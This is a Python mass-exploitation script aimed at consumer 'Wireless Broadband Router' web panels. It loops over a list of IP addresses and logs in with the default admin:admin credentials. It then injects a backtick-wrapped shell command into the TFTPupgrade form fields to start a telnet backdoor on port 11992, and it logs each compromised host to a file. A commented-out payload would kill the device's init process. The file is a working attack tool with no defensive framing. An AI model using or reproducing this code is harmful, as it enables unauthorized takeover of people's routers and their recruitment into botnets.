import threading

import httpx
import requests


class Main:
    def __init__(self, ip):
        self.ip = ip

        self.client = httpx.Client(verify=False, timeout=60)

    def exploit(self, cookie):
        try:
            payload = "telnetd -p 11992 -l /bin/login"
            #payload = "killall init"
            req = self.client.post(f"http://{self.ip}/goform/TFTPupgrade",
                                   data={
                                       "UpgradeProtocolType": "FTP",
                                       "HostIP": f"`{payload}`",
                                       "Port": f"`{payload}`",
                                       "ftpname": f"`{payload}`",
                                       "ftppass": f"`{payload}`",
                                       "FileName": "/mnt",
                                       "Submit_Upgrade": "Apply"
                                   }, headers=cookie)
            if '<head><title>Wireless Broadband Router</title>' in req.text:
                print(f"Exploited -> {self.ip}")
                with open('exploited.txt', 'a+') as f:
                    f.write(f"{self.ip}:11992 admin:admin\n")
                    f.close()
        except:
            pass

    def reboot(self, cookie):
        try:
            req = self.client.post(f"http://{self.ip}/cgi-bin/reboot.sh",
                                   data={
                                       "adv_button_shutdown": "Reboot"
                                   },
                                   headers=cookie)
            print(req.text)
        except:
            pass

    def login(self):
        try:
            req = self.client.post(f"http://{self.ip}/goform/login",
                                   data={
                                       "user": "admin",
                                       "psw": "admin",
                                       "save_login": 0
                                   })

            if 'auth' in req.cookies:
                if 'pass' in req.cookies['auth']:
                    self.exploit(req.cookies)
        except:
            pass


def thread(g):
    try:
        Main(g).login()
    except:
        pass


if __name__ == "__main__":
    for i in open('80.txt').read().splitlines():
        threading.Thread(target=thread, args=(i,)).start()
